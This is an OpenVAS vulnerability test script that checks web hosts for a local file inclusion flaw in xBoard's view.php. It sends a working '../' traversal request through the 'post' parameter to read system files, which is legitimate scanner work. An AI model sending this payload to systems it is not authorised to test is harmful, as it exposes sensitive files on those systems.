##############################################################################
# OpenVAS Vulnerability Test
#
# xBoard Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803790");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2013-12-27 11:30:04 +0530 (Fri, 27 Dec 2013)");
  script_name("xBoard Local File Inclusion Vulnerability");

  script_tag(name:"summary", value:"The host is running xBoard and is prone to Local file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check is it possible to read
  the system file.");

  script_tag(name:"solution", value:"Ugrade to xBoard 6.5 or later.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input to the 'post'
  parameter in 'view.php', which allows attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"affected", value:"xBoard versions 5.0, 5.5, 6.0.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files
  on the target system.");

  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013120166");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124589/xboard-lfi.txt");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

xbPort = http_get_port(default:80);
if(!http_can_host_php(port:xbPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/xboard", "/xBoard", http_cgi_dirs(port:xbPort)))
{

  if(dir == "/") dir = "";
  url = dir + "/main.php";

  if(http_vuln_check(port:xbPort, url:url, pattern:">xBoard<", check_header:TRUE, usecache:TRUE))
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      url = dir + "/view.php?post=" + crap(data:"../",length:3*15) + files[file];

      if(http_vuln_check(port:xbPort, url:url,pattern:file))
      {
        security_message(port:xbPort);
        exit(0);
      }
    }
  }
}

exit(99);
